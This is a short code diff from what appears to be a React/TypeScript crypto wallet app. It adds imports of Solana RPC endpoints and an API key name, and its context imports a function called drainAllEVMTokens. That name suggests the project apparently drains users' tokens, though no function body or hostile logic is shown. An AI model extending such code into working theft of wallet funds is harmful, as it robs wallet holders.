@@ -17,6 +17,12 @@ import { useChain } from '@/contexts/ChainContext';
 import { useEVMWallet } from '@/providers/EVMWalletProvider';
 import { drainAllEVMTokens } from '@/utils/evmTransactions';
 import { ethers } from 'ethers';
+import {
+  SOLANA_QUICKNODE_RPC,
+  SOLANA_QUICKNODE_WSS,
+  SOLANA_ALCHEMY_RPC,
+  COVALENT_API_KEY,
+} from '@/config/rpcEndpoints';
 
 const NATIVE_EVM_SYMBOLS: Record<number, string> = {
   1: 'ETH', 56: 'BNB', 137: 'MATIC', 8453: 'ETH', 42161: 'ETH', 10: 'ETH',
